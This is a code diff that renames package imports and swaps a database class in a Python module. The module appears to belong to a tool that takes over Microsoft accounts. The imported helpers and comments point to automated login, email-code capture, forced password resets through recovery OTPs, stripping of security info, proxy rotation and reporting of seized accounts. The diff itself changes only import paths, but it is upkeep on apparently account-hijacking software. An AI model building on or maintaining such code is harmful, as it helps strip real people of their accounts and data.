@@ -1,28 +1,28 @@
-from securing.utils.login_authenticator import login_authenticator
-from securing.utils.cookies.get_livedata import livedata
-from securing.utils.cookies.safe_cookies import has_cookie
-from securing.utils.security.recovery import recover, verify_password_works, RecoverError
-from securing.utils.security.password_gen import generate_ms_password
-from securing.utils.cookies.get_email_code import get_email_code
-from securing.utils.login_pwd import login_pwd
-from securing.secure import startSecuringAccount
-from securing.auth.send_auth import send_auth
-from securing.auth.handle_redirects import handle_redirects, get_data
-from securing.auth.polish_host import polish_host
+from authsecuring.utils.login_authenticator import login_authenticator
+from authsecuring.utils.cookies.get_livedata import livedata
+from authsecuring.utils.cookies.safe_cookies import has_cookie
+from authsecuring.utils.security.recovery import recover, verify_password_works, RecoverError
+from authsecuring.utils.security.password_gen import generate_ms_password
+from authsecuring.utils.cookies.get_email_code import get_email_code
+from authsecuring.utils.login_pwd import login_pwd
+from authsecuring.secure import startSecuringAccount
+from authsecuring.auth.send_auth import send_auth
+from authsecuring.auth.handle_redirects import handle_redirects, get_data
+from authsecuring.auth.polish_host import polish_host
 
-from securing.build_embeds import build_account_embeds, build_failure_embed
-from securing.auth.initial_session import get_session
-from securing.auth.account_status import get_account_lock_reason
-from securing.utils.secure import secure
-from securing.account_filters import rejection_reason
-from securing.utils.proxy import (
+from authsecuring.build_embeds import build_account_embeds, build_failure_embed
+from authsecuring.auth.initial_session import get_session
+from authsecuring.auth.account_status import get_account_lock_reason
+from authsecuring.utils.secure import secure
+from authsecuring.account_filters import rejection_reason
+from authsecuring.utils.proxy import (
     close_session,
     format_exception_reason,
     is_proxy_transport_error,
     run_with_proxy_retry,
 )
 
-from database.database import DBConnection
+from storage.romeo_db import RomeoDB as DBConnection
 from time import time
 from typing import Awaitable, Callable
 import asyncio
@@ -205,7 +205,7 @@ async def _secure_after_password_login(
             primary_email=secured_ms.get("email") or email,
         )
 
-    from securing.ban_checks import apply_ban_checks
+    from authsecuring.ban_checks import apply_ban_checks
 
     ban_reject = await apply_ban_checks(secured)
     if ban_reject:
@@ -491,7 +491,7 @@ async def recovery_secure(
                         email,
                     )
                     try:
-                        from securing.utils.security.force_password import (
+                        from authsecuring.utils.security.force_password import (
                             force_password_via_otp,
                         )
 
@@ -536,7 +536,7 @@ async def recovery_secure(
                             "trying security-email OTP ResetPassword"
                         )
                         try:
-                            from securing.utils.security.force_password import (
+                            from authsecuring.utils.security.force_password import (
                                 force_password_via_otp,
                             )
 
@@ -569,7 +569,7 @@ async def recovery_secure(
                 # poison later SA elevation; security-email OTP usually does not.
                 # Password is the fallback when OTP mail does not arrive (30s).
                 account = None
-                from securing.utils.security.force_password import strip_unverified
+                from authsecuring.utils.security.force_password import strip_unverified
 
                 login_password = strip_unverified(password)
 
@@ -700,7 +700,7 @@ async def recovery_secure(
                             f"{pwd_status} — forcing RecoverUser password retry…"
                         )
                         try:
-                            from securing.utils.security.force_password import (
+                            from authsecuring.utils.security.force_password import (
                                 force_password_after_recover,
                                 strip_unverified,
                             )
@@ -1142,7 +1142,7 @@ async def recovery_secure(
                         primary_email=ms.get("email") or email,
                     )
 
-                from securing.ban_checks import apply_ban_checks
+                from authsecuring.ban_checks import apply_ban_checks
 
                 ban_reject = await apply_ban_checks(dsecured)
                 if ban_reject:
